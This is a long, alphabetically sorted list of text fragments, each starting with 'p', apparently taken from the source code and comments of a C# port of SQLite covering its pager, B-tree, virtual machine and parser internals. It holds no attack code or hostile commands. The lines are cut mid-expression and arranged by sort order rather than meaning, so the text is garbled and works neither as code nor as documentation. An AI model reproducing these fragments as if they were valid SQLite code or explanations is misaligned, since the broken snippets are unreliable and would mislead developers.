 p.id==SQLITE_MUTEX_RECURSIVE )
 p.inTrans == TRANS_WRITE)
 p.inTrans > TRANS_NONE)
 p.inTrans==TRANS_WRITE) )
 p.info.nKey==iRow) ){
 p.lock.iTable==1 )
 p.m 
 p.magic == VDBE_MAGIC_HALT )
 p.mallocFailed != 0 )
 p.mask ) != 0 ) 
 p.n : 0 )
 p.n == sqlite3_aggregate_count( context ) )
 p.n > 0x7fffffff
 p.n > sqlite3_max_blobsize.iValue )
 p.nArg == nArg
 p.nArg == nArg )
 p.nBusy < 0 ) return 0
 p.nCol
 p.nOpAlloc 
 p.nRef!=0 
 p.nResColumn]
 p.op == TK_AGG_COLUMN ) 
 p.overflow != 0 ) )
 p.owner!=GetCurrentThreadId()
 p.owner==GetCurrentThreadId()
 p.pBt.nTransaction == 0 )
 p.pBt.nTransaction==0 )
 p.pBtree!=pBtree
 p.pColl != null 
 p.pDirty != pPage )
 p.pEList.nExpr != 1
 p.pEList.nExpr>db.aLimit[SQLITE_LIMIT_COLUMN] ){
 p.pFunc != null 
 p.pFunc != null )
 p.pFunc.xStep != null )
 p.pLeft.op == TK_INTEGER )
 p.pLimit != null )
 p.pLimit != null ) return 0
 p.pMem != null 
 p.pNext != pIndex ) { p = p.pNext
 p.pNext != pVfs )
 p.pNext == pIndex ) )
 p.pPrior != null )
 p.pPrior == null 
 p.pRight != null 
 p.pRight.u.zToken == null 
 p.pRight.u.zToken.Length > 0 )
 p.pSchema == db.aDb[1].pSchema )
 p.pSrc.a[0].pSelect != null
 p.pSrc.nSrc != 1 
 p.pSrc.pBt.inTransaction == TRANS_WRITE )
 p.pTab != null )
 p.pWhere != null ) return 0
 p.pc >= 0 )
 p.pgnoRoot == iRoot) 
 p.rSum : (double)0 )
 p.rc != SQLITE_DONE )
 p.rc == SQLITE_BUSY 
 p.rc == SQLITE_BUSY )
 p.rc == SQLITE_CONSTRAINT ) )
 p.rc == SQLITE_NOMEM )
 p.s 
 p.u.nZero
 p.u.zToken != null )
 p.usesStmtJournal )
 p.validJD != 0 )
 p.x.pList != null 
 p.x.pSelect != null )
 p.xCmp != null )
 p.xCmp == null 
 p.xCmp == null )
 p.xDel != null )
 p.xFunc == null 
 p.xStep != null ) )
 p.z != null )
 p.zBLOB.Length : p.n
 p.zName.Length == nFunc )
 p.zSql != null )
 p.zText == p.zBase)
 p1 
 p1 != 0 )
 p1 < db.nDb )
 p1 == SAVEPOINT_RELEASE 
 p1 == SAVEPOINT_RELEASE )
 p1 == SAVEPOINT_ROLLBACK )
 p1 > 0 
 p1 > z.Length 
 p1 > zBLOB.Length ) sb.Length = 0
 p1<<14 
 p2 
 p2 != 0 
 p2 (masked) 
 p2 (unmasked) 
 p2 > 0 )
 p2 > len )
 p2 >= 0 )
 p2!=p
 p2-- )
 p2<<14 
 p2<<7 
 p2=p2->pNextBlocked){
 p2th element of the argv array passed to xUpdate.
 p3 (masked) 
 p3 (unmasked) 
 p3<<14 
 p4 (unmasked) 
 p4<<14 
 p5 (unmasked) 
 p5<<14 
 p6 (unmasked) 
 p6<<15 
 p7 (unmasked) 
 p8 (unmasked) 
 p< sqlite3GlobalConfig.pScratch
 p=p->pNextBlocked){
 p=p->pUnlockConnection){}
 p=p.pDirtyPrev){
 p=p.pNext){
 p=sqliteHashNext(p)){
 p>=(void
 pA.iColumn != pB.iColumn ) return false
 pA.u.iValue != pB.u.iValue )
 pA.u.zToken != null )
 pA.v <= pA.pRight.v )
 pAggInfo.aCol[] entry.
 pAggInfo.nColumn == 0 )
 pAppData 
 pArg 
 pArg value is returned.  Otherwise NULL is returned.
 pArgc.flags==MEM_Int )
 pArray is a pointer to an array of objects.  Each object in the
 pArray->aBtree[i-1]->pBt<p->pBt )
 pAux passed to create_module() 
 pAux.pAux != null ) )
 pAuxData.xDelete != null )
 pB != null )
 pB == null )
 pB.pRight == null 
 pB.v <= pB.pRight.v )
 pB.x.pList != null )
 pBase.flags 
 pBest == null )
 pBest.nArg != nArg ) 
 pBest.nColumn < pTab.nCol )
 pBest.xFunc != null 
 pBt
 pBt.autoVacuum == false)
 pBt.autoVacuum))
 pBt.inTransaction == TRANS_NONE 
 pBt.inTransaction == TRANS_WRITE 
 pBt.inTransaction > TRANS_NONE)
 pBt.inTransaction==TRANS_WRITE )
 pBt.inTransaction==TRANS_WRITE) 
 pBt.incrVacuum == false)
 pBt.isExclusive ){
 pBt.isPending ){
 pBt.pPage1 != null)
 pBt.pPage1.aData != null)
 pBt.pPager != null)
 pBt.pSchema != null)
 pBt.pWriter )
 pBt.pWriter==pLock.pBtree )
 pBt.pageSize                               /
 pBt.pageSize <= 32768)
 pBt.pageSize > SQLITE_MAX_PAGE_SIZE
 pBt.pageSize to the page-size of the file on disk.
 pBt.pageSize) != 0)
 pBt.readOnly))
 pBt.usableSize 
 pBt=pBt.pNext){
 pBtree )
 pBtree->sharable==0 ) return
 pBuf must be a pointer to at least BITVEC_SZ bytes of temporary storage
 pC.pseudoTable )
 pC.seekResult : 0 )
 pC.useRandomRowid )
 pCache.nMin - pcache1.nMinPage )
 pCache.pDirty == null )
 pCache.pPage1 != null )
 pCache.szExtra 
 pCache.szExtra )
 pCache.szExtra]
 pCache.szPage
 pCell < pStop ) 
 pCell = pPage.aData
 pCell >= 
 pCell.Length : pPage.aOvfl[-(iCell 
 pCheck.mxErr != 0
 pCheck.mxErr != 0)
 pChunk != null 
 pChunk = pNextChunk )
 pCol.affinity == sqlite3AffinityType( zType ) )
 pColl == null 
 pColl.xCmp != null )
 pColl.xCmp == null ) )
 pCons != null 
 pCsr != null 
 pCsr = pCsr.pNext) 
 pCsr.pBt.inTransaction==TRANS_WRITE )
 pCsr.pBtree != p
 pCur != null
 pCur = pCur.pNext)
 pCur cursor is pointing to.  The pointer is to the beginning of
 pCur is always valid so KeySize cannot fail 
 pCur is pointing to the leaf page from which a cell was removed to
 pCur might be pointing to text obtained from a corrupt database file.
 pCur points at an index entry created using the OP_MakeRecord opcode.
 pCur.aOverflow[iIdx
 pCur.aOverflow[iIdx]==nextPage)
 pCur.aOverflow[offset/ovflSize] ){
 pCur.aiIdx[pCur.iPage] value is set to the index of the parent cell
 pCur.apPage[0].intKey != 0
 pCur.apPage[0].intKey == 0)
 pCur.apPage[pCur.iPage] != null)
 pCur.atLast != 0)
 pCur.eState != CURSOR_FAULT) r
 pCur.eState == CURSOR_INVALID)
 pCur.eState == CURSOR_VALID
 pCur.eState == CURSOR_VALID)
 pCur.iPage > iCellDepth)
 pCur.iPage >= 0 
 pCur.idx is set to the cell index that contains the pointer
 pCur.info.iCell 
 pCur.info.nData)
 pCur.info.nHeader
 pCur.info.nHeader 
 pCur.info.nHeader )
 pCur.info.nHeader)
 pCur.info.nKey < intKey)
 pCur.info.nLocal > pBt.usableSize//
 pCur.skipNext != 0)
 pCur.validNKey
 pD0
 pD0 < nField 
 pD0 <= pOp.p1 
 pD0]
 pData->z==pData->zMalloc )
 pData[Offset 
 pData[i]
 pDatabase is NULL if the database name qualifier is missing - the
 pDatabase parameters are NULL for subqueries.  The pOn and pUsing
 pDb.zName : null
 pDel == pColl[0] )
 pDel->xDestroy ){
 pDest     /
 pDest.eDest == SRT_Discard )
 pDest.eDest == SRT_Output )
 pDest.eDest == SRT_Union 
 pDest.pIndex != null ) 
 pDest.z == sMem.z )
 pDestIdx != null 
 pDestIdx = pDestIdx.pNext )
 pDestIdx has no corresponding index in pSrc 
 pDflt == null )
 pDflt.op == TK_NULL )
 pDirty != null 
 pDirty = pDirty.pDirtyNext )
 pDone != null )
 pDone == null )
 pDone always used on sub-journals 
 pDone never used on non-savepoint 
 pE is a pointer to an expression which is a single term in the
 pE.iTable == pExpr.iTable 
 pE.pLeft.op == TK_ID ) )
 pE.pRight != null )
 pE.pRight.op != TK_ALL ) )
 pE.pRight.op == TK_ALL ) break
 pE.u.zToken.Length == n )
 pE.x.pList.nExpr != 1 )
 pEList corresponds to the result set of a SELECT and is NULL for
 pEList has been resolved.  pE has not.
 pEList is a list of expressions which are really the result set of the
 pEList is the SET clause of an UPDATE statement.  Each entry
 pEList.nExpr != 1 ) return 0
 pEList.nExpr == mx 
 pEList.nExpr == mx )
 pEList.nExpr > 0 )
 pEList.nExpr > mx )
 pEType > 5)
 pEType will always exist. No need to test
 pElem
 pElem 
 pElem != null 
 pElem = pElem.next )// ( pElem = sqliteHashFirst( pHash ) 
 pElem = pElem.next )//sqliteHashFirst(
 pElem = sqliteHashNext( pElem ) )
 pElem = sqliteHashNext(pElem))
 pEnd != null )
 pEnd == null ) 
 pEnd must be non-NULL if pStart is 
 pEnd->n
 pEntry.chain : null
 pExcept is used to modify the table (BtreeDelete() or BtreeInsert()).
 pExcept.pBt == pBt)
 pExisting.pBt==pBt ){
 pExpr != null )
 pExpr is a comparison operator.  Return the type affinity that should
 pExpr is an operand of a comparison operator.  aff2 is the
 pExpr is original.  Make a new entry in pAggInfo.aFunc[]
 pExpr points to an expression which implements a function.  If
 pExpr->iTable==pStack->oldIdx )
 pExpr.
 pExpr.iColumn < pEList.nExpr )
 pExpr.iTable != _base )
 pExpr.iTable == iTable )
 pExpr.iTable contains the values that make up the (...) set.
 pExpr.iTable!=pSrc.iCursor ) break
 pExpr.op != TK_IN )
 pExpr.op <= TK_GE )
 pExpr.op == TK_GE 
 pExpr.op == TK_IN 
 pExpr.op == TK_LE 
 pExpr.op == TK_LT 
 pExpr.op == TK_SELECT )
 pExpr.pRight == null )
 pExpr.pTab != null
 pExpr.pTab!=0 happens when pExpr was originally
 pExpr.u.zToken[0] == 'X' )
 pExpr.x.pList != null
 pExpr.x.pList != null )
 pExpr.x.pList.nExpr != 2
 pExprList -> A list of the columns to update and the expressions to update
 pFKey != null 
 pFKey = pNextFKey )
 pFarg.nExpr : 0
 pFile = (winFile
 pFile.locktype == SHARED_LOCK )
 pFile.pMethods == null )
 pFile.shared.bExclusive == 0){
 pFrom contains an SQL NULL when this routine returns.
 pFrom.db == pTo.db )
 pFrom.nCell)
 pFrom.pIndex and return SQLITE_OK.
 pFrom.z==pFrom.zMalloc ){
 pFrom.zIndex != null 
 pFrom.zIndex.Length != 0 )
 pFunc == pMem.u.pDef )
 pFunc.xFinalize != null ) )
 pGroupBy != null )
 pGroupBy == null )
 pGroupBy.nExpr 
 pH.count > 2 
 pH.ht[h] != null )
 pH.htsize )
 pHash 
 pHeap 
 pID)
 pIdList   -> If this is an INSERT INTO ... (<column-names>) VALUES ...
 pIdx
 pIdx != null 
 pIdx = pIdx.pNext )
 pIdx is not a UNIQUE index 
 pIdx to the values in the n registers starting at _base.
 pIdx.aiColumn[j] != iColumn 
 pIdx.nColumn < pBest.nColumn )
 pIdx.onError != OE_None ) )
 pIdx.zColAff[0] == '
 pIdx=pIdx.pNext){
 pIdxKey != null)
 pIn.nMem columns to be output.  pDest is where the output should
 pIn2.flags
 pIn2.flags 
 pIn2.flags ) 
 pIn2.n
 pIn2.n]
 pIn2.zBLOB : Encoding.UTF8.GetBytes( pIn2.z )
 pIn3.flags
 pIn3.r > 0 ) )
 pIndex != null 
 pIndex = pIndex.pNext )
 pIndex = pNext )
 pIndex.nColumn
 pIndex.onError == OE_Default ) )
 pInfo.pTab != pTab ) { pInfo = pInfo.pNext
 pInitMutex 
 pItem.iCol <= p.pEList.nExpr )
 pItem.isPopulated != 0 ) continue
 pItem.zIndex == null )
 pIter
 pIter.eLock!=eLock ){
 pIter.eLock==READ_LOCK)
 pIter.eLock==WRITE_LOCK )
 pIter.eLock==WRITE_LOCK)
 pIter.iTable==iTab 
 pIter.pBtree==p 
 pIter.pBtree==p ){
 pIter<pEnd )
 pIter=pIter.pNext){
 pKey == null))
 pKeyInfo.aColl[i] : null )
 pKeyInfo.aSortOrder[i] != 0 )
 pKeyInfo.aSortOrder[j] != 0 )
 pLater
 pLater->pNext->pBt>pLater->pBt )
 pLater->wantToLock>0 )
 pLater=pLater->pNext){
 pLeft.iColumn == -1 )
 pLevel.u._in.nIn > 0 )
 pLimit != null )
 pLimit and pOffset expressions.  pLimit and pOffset hold the expressions
 pList != null 
 pList )
 pList : null )
 pList : pTab.pTrigger )
 pList is a list of columns to be indexed.  pList will be NULL if this
 pList might be NULL following an OOM error.  But pName should never be
 pList might be NULL following an OOM error.  But pSpan should never be
 pList!=0 if pF->pFunc has NEEDCOLL 
 pList.nAlloc == 0 ) )
 pList.nExpr : 0
 pList.pNext!=pBt ){
 pLock
 pLock.eLock>=eLockType
 pLock.iTable==1))
 pLock.pBtree==p )
 pLock==
 pLock=pLock.pNext){
 pLoop != null 
 pLoop = pLoop.pPrior )
 pMaskSet.n == 0 )
 pMatch != null )
 pMem = p.pResultSet = p.aMem[1]
 pMem->z!=pMem->zMalloc ){
 pMem->zMalloc 
 pMem.db.mallocFailed != 0 
 pMem.enc == desiredEnc )
 pMem.enc!=desiredEnc)
 pMem.enc==desiredEnc)
 pMem.flags
 pMem.u.nZero )
 pMem.u.nZero : 0 ) == (int)sqlite3VdbeSerialTypeLen( serial_type ) )
 pMem.xDel != null )
 pMem.xDel == null )
 pMem.xDel!=null) 
 pMem.z != pMem.zMalloc )
 pMem.z == null )
 pMem.z.Length : 0
 pMem.z==pMem.zMalloc ){
 pMem.zBLOB != null ) pMem.z = Encoding.UTF8.GetString( pMem.zBLOB )
 pMem.zBLOB.Length : pMem.z != null 
 pMem.zMalloc==pMem.z) 
 pMem1.enc == SQLITE_UTF16BE )
 pMem2.n : pMem1.n )
 pMemPage.pgno == iPage)
 pMeta>0 ) pBt.readOnly = 1
 pModule)
 pNC.pSrcList == null ) return null
 pNC.pSrcList.nAlloc > 0 )
 pName is the name of the table to be dropped.
 pName.n )
 pName.z != null )
 pName1 == null )
 pName2 != null )
 pName2) that stores the unqualified table name.  The index of the
 pName2) that stores the unqualified table name. The variable iDb is
 pName2.n > 0 )
 pName2.z == null 
 pName2.z.Length == 0 )
 pNew
 pNew.flags ) 
 pNew.nCol )
 pNew.zName == null )
 pNewPage.intKey != pCur.apPage[i].intKey)
 pNext 
 pNum == Int64.MaxValue  ) result = false
 pOffset <= pPager.journalHdr ) )
 pOld == p )
 pOld.aOvfl[0].idx
 pOld.aOvfl[0].idx : -1)
 pOld.aOvfl[0].idx == pOld.aOvfl[1].idx - 1)
 pOld.aOvfl[1].idx == pOld.aOvfl[2].idx - 1)
 pOld.nCell 
 pOld.nOverflow
 pOld.pgno != pNew.pgno)
 pOp.opcode == OP_Null 
 pOp.opcode == OP_RowData )
 pOp.opcode == OP_RowKey )
 pOp.p1 
 pOp.p1 ){
 pOp.p1 < db.nDb )
 pOp.p1 < iReg 
 pOp.p1 < p.nCursor )
 pOp.p1 <= p.nMem )
 pOp.p1 <= p.nVar )
 pOp.p1 >= iReg 
 pOp.p2 
 pOp.p2 != 0 )
 pOp.p2 )
 pOp.p2 - 1 
 pOp.p2 < 0 )
 pOp.p2 < p.nOp )
 pOp.p2 <= p.nMem 
 pOp.p2 <= p.nMem )
 pOp.p2 == OE_Abort )
 pOp.p2 > 0 
 pOp.p3 - n - 1]
 pOp.p3 <= p.nMem 
 pOp.p3 <= p.nMem )
 pOp.p3 == 1 )
 pOp.p3 == iDb )
 pOp.p3 == pExpr.iTable
 pOp.p3 == target
 pOp.p3 >= pOp.p1 
 pOp.p3 >= pOp.p2 
 pOp.p3<=p.nMem )
 pOp.p4.i <= p.nMem )
 pOp.p4.pColl == null )
 pOp.p4.pVdbeFunc : pOp.p4.pFunc )
 pOp.p4.pVtab==pVTab){
 pOp.p4.z != null )
 pOp.p4.z : p.zSql )
 pOp.p4.z == null
 pOp.p4.z.Length == 0 ) 
 pOp.p4type == P4_VDBEFUNC )
 pOp.p5 == 1 )
 pOp.zComment != null 
 pOrTerm
 pOrTerm < pOrWCEnd 
 pOrTerm.eOperator == WO_AND )
 pOrderBy == null )
 pOrderBy is an ORDER BY clause from a SELECT statement.  pTab is the
 pOrderBy is an ORDER BY or GROUP BY clause in SELECT statement pSelect.
 pOrig.u.zToken == null )
 pOther.pNext != pDef )
 pOther.pNext.onError != OE_Replace )
 pP4 != null )
 pPackageSid != null)
 pPage 
 pPage != null 
 pPage = pPage.pNext ) 
 pPage == null)
 pPage == p.pDirty )
 pPage == p.pDirtyTail )
 pPage == pcache1.pLruTail ) )
 pPage and up to NB siblings after balancing 
 pPage and up to two siblings 
 pPage is a leaf node. This loop navigates the cursor so that it
 pPage is not necessarily writeable since pCell might be auxiliary
 pPage is the leaf page which is the right-most page in the tree.
 pPage might not be a btree page
 pPage).
 pPage.aData 
 pPage.aData[pCell 
 pPage.aOvfl[0].idx == pPage.nCell
 pPage.childPtrSize
 pPage.childPtrSize)
 pPage.childPtrSize]
 pPage.iKey != iKey 
 pPage.leaf
 pPage.leaf == 1)
 pPage.leaf)
 pPage.leaf))
 pPage.nCell
 pPage.nCell > 0 
 pPage.nCell > 0)
 pPage.nCell must be greater than zero. If this is the root-page
 pPage.nFree <= nMin)
 pPage.nOverflow != 0)
 pPage.nOverflow == 1
 pPage.nOverflow > 0)
 pPage.nOverflow is incremented.
 pPage.nOverflow)
 pPage.pDirtyPrev == null 
 pPage.pLruNext == null )
 pPager at the current location. The master journal name must be the last
 pPager.changeCountDone )
 pPager.dbModified )
 pPager.dbOrigSize == 0 )
 pPager.dbSize == 0 )
 pPager.dbSize>=pPager.dbFileSize
 pPager.dbSizeValid == false )
 pPager.errCode
 pPager.errCode != SQLITE_FULL )
 pPager.errCode!=SQLITE_FULL ){
 pPager.errMask = 0
 pPager.exclusiveMode
 pPager.fullSync 
 pPager.jfd : pPager.sjfd
 pPager.journalHdr 
 pPager.journalMode != PAGER_JOURNALMODE_OFF )
 pPager.journalMode == PAGER_JOURNALMODE_MEMORY
 pPager.journalMode == PAGER_JOURNALMODE_OFF
 pPager.journalMode == PAGER_JOURNALMODE_PERSIST
 pPager.journalMode==PAGER_JOURNALMODE_OFF )
 pPager.journalOff < iHdrOff )
 pPager.journalOff < szJ 
 pPager.journalOff < szJ )
 pPager.journalOff == 0 )
 pPager.journalOff == szJ )
 pPager.journalOff > 0 
 pPager.journalOff > 0 ) )
 pPager.journalOff. See comments above function writeJournalHdr() for
 pPager.journalOff==jrnlBufferSize(pPager)
 pPager.memDb != 0
 pPager.memDb == 0
 pPager.nPage = 0
 pPager.nRef = 0
 pPager.nSavepoint != 0 )
 pPager.nSavepoint == 0 )
 pPager.needSync = 0
 pPager.noSync )
 pPager.noSync == false )
 pPager.pBusyHandlerArg = 0
 pPager.pFirst = 0
 pPager.pFirstSynced = 0
 pPager.pInJournal == null )
 pPager.pLast = 0
 pPager.pageSize )
 pPager.pageSize ) )
 pPager.sectorSize )
 pPager.setMaster != 0
 pPager.state = PAGER_UNLOCK
 pPager.state == PAGER_SHARED )
 pPager.state > PAGER_SHARED )
 pPager.state >= PAGER_EXCLUSIVE )
 pPager.state >= PAGER_RESERVED )
 pPager.stmtInUse = 0
 pPager.stmtJSize = 0
 pPager.stmtOpen = 0
 pPager.stmtSize = 0
 pPager.subjInMemory != 0 )
 pPager.sync_flags )
 pPager.tempFile )
 pPager.useJournal != 0 )
 pPager.xBusyHandler = 0
 pPager.xBusyHandler( pPager.pBusyHandlerArg ) != 0 )
 pParent != null 
 pParent is its parent.  pPage must have a single overflow entry
 pParent.aOvfl[0].idx == iParentIdx)
 pParent.hdrOffset <= apNew[0].nFree)
 pParent.nCell
 pParent.nCell == 0 
 pParent.nCell == 0))
 pParent.nCell == iIdx
 pParent.nOverflow != 0)
 pParent.nOverflow == 1)
 pParent.pgno != 1
 pParse.
 pParse.aAlias[iAlias-1] records the register number where the value
 pParse.ckBase
 pParse.cookieMask ) == 0 ) continue
 pParse.db.mallocFailed != 0 
 pParse.explain != 0 )
 pParse.explain == 0 )
 pParse.iCacheLevel == iCacheLevel )
 pParse.nAliasAlloc > 0 )
 pParse.nErr != 0 
 pParse.nErr != 0 )
 pParse.nErr > 0 
 pParse.nTempReg < ArraySize( pParse.aTempReg ) )
 pParse.nVar > db.aLimit[SQLITE_LIMIT_VARIABLE_NUMBER] )
 pParse.nested == 0
 pParse.nested == 0 
 pParse.nested == 0 )
 pParse.pVdbe != null 
 pParse.pVdbe != null )
 pParse.rc != SQLITE_DONE 
 pParse.rc == SQLITE_OK )
 pParse.sLastToken.n
 pParse.trigStack != null )
 pParse.trigStack == null 
 pParse.trigStack == null )
 pParse.trigStack.orconf : OE_Default )
 pParse.writeMask ) != 0 )
 pParse.zErrMsg and these routines return non-zero.  If everything
 pParse.zErrMsg.
 pParser.yyidx >= 0)
 pPayload >= 
 pPayload is a pointer to data stored on database page pDbPage.
 pPayloadIndex = 4
 pPg != null 
 pPg = pPg.pDirtyPrev ) 
 pPg == null )
 pPg refers to will not be written to again within this transaction.
 pPg->pData. A shared lock or greater must be held on the database
 pPg.nRef != 0 
 pPg.pPager.memDb != 0 )
 pPg.pageHash==pager_pagehash(pPg) )
 pPg.pgno <= pPg.pPager.dbSize )
 pPg.pgno > pPager.dbOrigSize )
 pPg.pgno > pPager.dbSize 
 pPgOld.nRef == 1 )
 pPgno will always exist. No need to test
 pPrior >= 
 pPrior will be the t2 query.  p.op will be TK_UNION in this case.
 pPrior.pEList != null )
 pPrior==0 while have been intercepted by higher-level routine and
 pPriorIndex = 0
 pProbe != null 
 pProbe = ( pSrc.pIndex != null 
 pProbe.aiRowEst[0] : 1000000
 pRec
 pRec <= pLast
 pRec <= pLast 
 pRec.n > 0 )
 pRes is as follows:
 pRet )
 pRight.op == TK_COLUMN )
 pRight.pUsing != null )
 pRightTab == null ) ) continue
 pS != null 
 pS = pS.pNext ) { }
 pSavepoint.iHdrOffset : szJ
 pSavepoint.nOrig : pPager.dbOrigSize
 pScratch 
 pSelect != null /
 pSelect == null )
 pSelect == null ) /
 pSib.pNext.pBt<p.pBt ){
 pSib.sharable ){
 pSpace buffer passed to the latter call to balance_nonroot().
 pSpan.zStart.Length : pSpan.zStart.Length - pSpan.zEnd.Length )
 pSrc != null )
 pSrc is the full-name of the table being altered.
 pSrc.aCol[i].notNull == 0 )
 pSrc.colUsed < ( ( (Bitmask)1 ) << ( BMS - 1 ) ) )
 pSrc.nSrc != 1 )
 pSrc.nSrc == 1 )
 pSrc.nSrc > 1 ) return 0
 pSrcIdx != null 
 pSrcIdx = pSrcIdx.pNext )
 pSrcList.a[i].iCursor < pParse.nTab )
 pSrcList.nSrc==1 )
 pStart
 pStmt == null )
 pStmt associated with the [database connection] pDb.  If pStmt is NULL
 pSub != null 
 pSub = pSub.pPrior )
 pSub.pLimit != null
 pSub.pLimit != null 
 pSub.pOrderBy != null )
 pSub.pOrderBy != null ) return 0
 pSub.selFlags 
 pSub1 != null 
 pSub1 = pSub1.pPrior )
 pSub1.op != TK_ALL )
 pSub1.pSrc.nSrc != 1
 pSubitem->pTab is always non-NULL by test restrictions and tests above.
 pTab != null 
 pTab == null )
 pTab as well as the triggers lised in pTab->pTrigger.
 pTab is a pointer to a Table structure representing a virtual-table.
 pTab->pVTable!=0) ){
 pTab.aCol[i].affinity == SQLITE_AFF_REAL )
 pTab.aCol[i].pDflt == null )
 pTab.azModuleArg[0] )
 pTab.nCol < BMS )
 pTab.nCol)
 pTab.pIndex != null )
 pTab.pIndex == null
 pTab.pIndex == null )
 pTab.pIndex.onError == OE_Replace )
 pTab.pSchema == db.aDb[1].pSchema )
 pTab.pSelect != null )
 pTab.pSelect != null ) continue
 pTab.pSelect ){
 pTab.pSelect == null )
 pTab.zName != null )
 pTab.zName if this function is being called to code part of an
 pTabList != null )
 pTabList.a[0] : null
 pTabList.a[j].iCursor != pExpr.iTable 
 pTabList.nSrc > 1 )
 pTable != null )
 pTblName == null )
 pTerm
 pTerm converted into an IN operator.
 pTerm is only used when wsFlags
 pTerm.eOperator != WO_ISNULL )
 pTerm.sortOrder
 pTerm.sortOrder == 1 )
 pTerm.u.leftColumn == iColumn
 pTmpSpace == null ) goto bitvec_end
 pTo are freed.  The pFrom.z field is not duplicated.  If
 pTo table that the foreign key points to.  flags contains all
 pTo.db == null 
 pTo.n 
 pToCol.nExpr != 1 )
 pToCol.nExpr != pFromCol.nExpr )
 pToken.z == null 
 pToken.z.Length == 0
 pTrig != null 
 pTrig = pTrig.pNext )
 pTrig == null ) goto triggerfinish_cleanup
 pTrigger != null )
 pTrigger != null ) 
 pTriggerStack is scanned to ensure that the trigger is not about to be coded
 pTriggerStep.orconf : orconfin
 pUnpacked is either created without a rowid or is truncated so that it
 pUserData 
 pUsing != null ) )
 pV == null 
 pVal.db == null
 pVal.db.mallocFailed != 0
 pVal.r
 pVal.u.i
 pValue to that integer and return true.  Otherwise return false.
 pVdbe
 pVdbe.inVtabMethod<2 
 pVdbe.pc>=0 ){
 pVdbe=pVdbe.pNext){
 pVdbeFunc.nAux : 0 )
 pVdbeFunc.nAux <= iArg )
 pVfs != null 
 pVfs = pVfs.pNext )
 pVfs to create the underlying on-disk files.
 pVfs.szOsFile )
 pVm.pResultSet != null 
 pVm.pResultSet == null ) return 0
 pVtab 
 pVtab->db!=db
 pVtab=pVtab->pNext)
 pWC.op == TK_AND )
 pWInfo.nLevel == 1 )
 pWalker.xSelectCallback == null ) return WRC_Continue
 pWhere    -> The WHERE clause of the DELETE statement if one is specified.
 pWhere    -> The WHERE clause of the UPDATE statement if one is specified.
 pWhere == null 
 pWhere argument is an optional WHERE clause that restricts the
 pX.op == TK_GT )
 pX.x.pSelect : null )
 p[0] != null 
 p[0].db == p[1].db )
 p[3 
 p[3] )
 p[offset 
 page 1) is never added to the freelist.
 page 1. So if some other shared-cache client already has a write-lock
 page and SQLITE_OK is returned. In this case the caller is required
 page cache implementation into that object.</dd>
 page cache size value and the persistent page cache size value
 page cache size value.  It does not change the persistent
 page cache size.  The local setting can be different from
 page cache size.  The value returned is the maximum number of
 page count has already been successfully read and cached.  So the
 page currently held in memory before returning SQLITE_OK. If an IO
 page data. In this case the file will be updated when the current
 page from the pager layer with the 'no-content' flag set. True otherwise.
 page has a small header which contains the Ptr(N) pointer and other
 page header    
 page header.  The page header size is 20 to 40 bytes depending on
 page iSrcPg from the source database. Copy this data into the
 page in the B-Tree structure (not including overflow pages).
 page in this case.
 page is P2.  Or if P5!=0 use the content of register P2 to find the
 page is added to the LRU list.  When all references to all pages
 page is also updated.
 page is initialized to all zeros.
 page is page 1 and we are the only child of that page.
 page is the right-child of the parent. Copy the contents of the
 page is then overwritten to make it an empty page with the right-child
 page number of the child page to move to.
 page number that used to be the last root page in the file before
 page number to look up in the pointer map.
 page number.  Transient tables are used to hold the results of a
 page of data and the current value of pPager.cksumInit.
 page of the database.  The data might change or move the next time
 page passed as the second argument from oldKey to newKey. If the cache
 page pointed to by p is invalid.
 page pointer.
 page points to multiple leaf pages.  The content of a leaf page is
 page records following this header and 
 page sizes of the source and destination differ.
 page that does not require a journal-sync (one with PGHDR_NEED_SYNC
 page that stores the required pointer. PTRMAP_PTROFFSET returns
 page that will become the new right-child of pPage. Copy the contents
 page to agree with the restored data.
 page to which it is currently pointing.  Notice the difference
 page-header flags indicate that the [virtual] root-page is the expected
 page-size bytes of space for parent ovfl 
 page.
 page.  1 means allocate a new page if space is easily available.  2 
 page.  If the payload is larger than the preset amount then surplus
 pageSize != pPager.pageSize
 pageSize !=0 
 pageSize < 512 
 pageSize <= SQLITE_MAX_PAGE_SIZE 
 pageSize <= SQLITE_MAX_PAGE_SIZE ) )
 pageSize > SQLITE_MAX_PAGE_SIZE)
 pageSize) != 0 
 pageSize) == 0)
 pager based on the value returned by the xSectorSize method
 pager if this call closed the only read or write transaction.  
 pager moves to PAGER_SHARED state (and downgrades the lock on the
 pager was already in the error-state when this function was called.
 pager.h.
 pagerPagecount(pBt) == 0)
 pager_incr_changecounter() function is called to update the change
 pager_incr_changecounter() to update the change-counter in indirect
 pager_playback() function for additional information.
 pager_playback_one_page() call returns SQLITE_DONE or an IO error
 pager_unlock() is a no-op for exclusive mode and in-memory databases. 
 pages are in use.
 pages in the page cache.  The second form sets both the current
 pages in the page cache.  The second form sets the local
 pages into the database file without harm to concurrent
 pages need to be changed.
 pages that do contain overflow cells.
 pages that have been copied into the destination database are still
 pages that need to be rolled back and that the number of pages
 pages that need to be updated or the size of the source database file
 pages to improve performance is an example of non-essential memory.
 panic rather than return SQLITE_MISUSE.
 parameter [SQLITE_LIMIT_VARIABLE_NUMBER] (default value: 999).
 parameter determines whether or not the LIKE operator is case
 parameter instead of just a Table
 parameter is 1 for INITIALLY DEFERRED and 0 for INITIALLY IMMEDIATE.
 parameter is a pointer to an integer that contains the offset at
 parameter is an arbitrary client data pointer that is passed through
 parameter is ignored if pToken is NULL or if the token does not
 parameter is less than -1 or greater than 127 then the behavior is
 parameter is needed to determine a boundary case.  A string
 parameter of any function at any time.  The only guarantee is that
 parameter of the other to pTab->tnum.  
 parameter should be 6 times the size of the largest database page size.
 parameter to [sqlite3_bind_blob
 parameter to the sqlite3_set_authorizer() interface. The second parameter
 parameter) and the compile time value of SQLITE_TEMP_STORE. The
 parameter.
 parameter.  If the first parameter to sqlite3_realloc()
 parameter. For all forms except 
 parameters are set as follows:
 parameters are set for the explicitly declared column. If there is no
 parameters are the content of the ON and USING clauses.
 parameters that may or may not be used depending on compilation options.
 parameters. An aggregate SQL function requires an implementation of xStep
 parent page stored in the pointer map is page pTo. If pFrom contained
 parse structures such as Select or Expr.  Such printouts are useful
 parse.
 parsed and a VDBE program to execute that statement has been
 parser accepts 
 parser fails 
 parser for analysis.
 parser is doing to make this happen.  This is the second bug report
 parser's stack.  Information stored includes:
 parsing a CREATE TABLE statement.
 parsing a CREATE TABLE statement.  The pFirst token is the first
 part of SQLite causes Sync to be called by mistake.
 part of a number.
 part of any insert batch prior to iBatch.  Return 1 or 0.
